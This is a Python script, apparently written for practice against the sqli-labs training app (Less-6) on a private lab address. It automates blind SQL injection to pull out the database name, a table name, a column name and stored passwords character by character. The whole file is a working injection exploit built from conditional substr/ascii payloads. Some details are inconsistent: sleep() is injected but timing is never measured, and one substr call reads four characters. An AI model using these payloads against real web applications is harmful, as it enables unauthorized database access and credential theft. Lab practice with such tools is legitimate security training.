#!/usr/bin/python3.6
# -*- coding: utf-8 -*-

import re
import time
import requests


result1 = []
#a = 数据库表名位置
for a in range(1,9):
#i = a~z
	for i in range(97,123):


		#库名url

		#http://172.28.0.21/pentest/sqli-labs/Less-6/?id=1%22%20and%20if(ascii(substr(database(),1,1))%3E109,sleep(5),1)%23
		
		url_db = "http://172.28.0.21/pentest/sqli-labs/Less-6/?id=1\" and if(ascii(substr(database()," + str(a) + ",4))=" + str(i) + ",sleep(1),1)%23"


		# time = response.elapsed.microseconds   #打印网页响应时间

		# print (time)

		reg = r'.*(You are in).*'
		response1 = requests.get(url_db)

		dbresult = re.findall(reg,response1.text)
		if dbresult:
			# print ('Query Failed')
			# print (ur61)
			# print ('状态码：'+str(response.status_code))
			# print (response.content)
			# print (response.encoding)
			# print (response.headers)
			# print (response.json)
			# print ('数据包长度：'+str(len(response.text)))
			pass
			# with open ('sql11','a+') as f:
			# 	f.write(response.text)
		else:
			# print ('Query Successful')
			# print (url61)
			# print ('状态码：'+str(response1.status_code))
			# print (response.content)
			# print (response.encoding)
			# print (response.headers)
			# print (response.json)
			# print ('数据包长度：'+str(len(response1.text)))
			# print ("尝试字符:'{0}'".format(chr(i)))
			result1.append(chr(i))

dbname = ''.join(result1)

# print ('数据库名是：{0}'.format(dbname))

#表名url
#http://172.28.0.21/pentest/sqli-labs/Less-6/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema= "security" limit 0,1),1,1))>100,sleep(3),1)%23

result2 = []
for a in range(1,9):

		for i in range(97,123):
			url_table = 'http://172.28.0.21/pentest/sqli-labs/Less-6/?id=1"' + ' and if(ascii(substr((select table_name from information_schema.tables where table_schema='+ '"' + dbname + '"' + ' limit 0,1),' + str(a) + ',1))=' + str(i) + ',sleep(1),1)%23'
			# print (url61)
			response2 = requests.get(url_table)
			reg = r'.*(You are in).*'
			tableresult = re.findall(reg,response2.text)

			if tableresult:
				pass
			else:
				# print ('Query Successful')
				# print (url61)
				# print ('状态码：'+str(response2.status_code))
				# print (response.content)
				# print (response.encoding)
				# print (response.headers)
				# print (response.json)
				# print ('数据包长度：'+str(len(response2.text)))
				# print ("尝试字符:'{0}'".format(chr(i)))
				result2.append(chr(i))

tablename = ''.join(result2)


result3 = []

for a in range (1,9):

	for i in range (48,123):
		#字段名
		url_column = 'http://172.28.0.21/pentest/sqli-labs/Less-6/?id=1" and if(ascii(substr((select column_name from information_schema.columns where table_name=' + '"' + tablename + '"' + ' limit 0,1),' + str(a) + ',1))=' + str(i) + ',sleep(3),1)%23'
		# print (url_column)
		response3 = requests.get(url_column)
		reg = r'.*(You are in).*'
		columnresult = re.findall(reg,response3.text)

		if columnresult:
			pass
		else:
			result3.append(chr(i))


columnname = ''.join(result3)


result4 = []

for a in range (1,9):

	#匹配数字0~9,A~Z,a~z
	for i in range (1,123):

		#内容字段

		url_content = 'http://172.28.0.21/pentest/sqli-labs/Less-6/?id=1" and if(ascii(substr((select password from security.emails limit 0,1),' + str(a) + ',1))=' + str(i) + ',sleep(3),1)%23'

		response4 = requests.get(url_content)

		reg = r'.*(You are in).*'

		contentresult = re.findall(reg,response4.text)

		if contentresult:
			pass
		else:
			print (url_content)
			print (chr(i))
			result4.append(chr(i))



contentname = ''.join(result4)

print ('数据库名是：{0}'.format(dbname))

print ('数据库表名是：{0}'.format(tablename))

print ('数据库表字段名是：{0}'.format(columnname))

print ('数据库表内容名是：{0}'.format(contentname))

# http://172.28.0.21/pentest/sqli-labs/Less-5/?id=1' and substr(database(),2,1)='e'%23
# url5 = "http://172.28.0.21/pentest/sqli-labs/Less-5/?id=1' and substr(database()," + str(a) + ",1)='"+ chr(i) +"'%23"

# 		reg = r'.*(You are in).*'
# 		response = requests.get(url)
# 		result = re.findall(reg,response.text)
# 		if result:
# 			result1.append(chr(i))	
# 			with open ('sql11','a+') as f:
# 				f.write(response.text)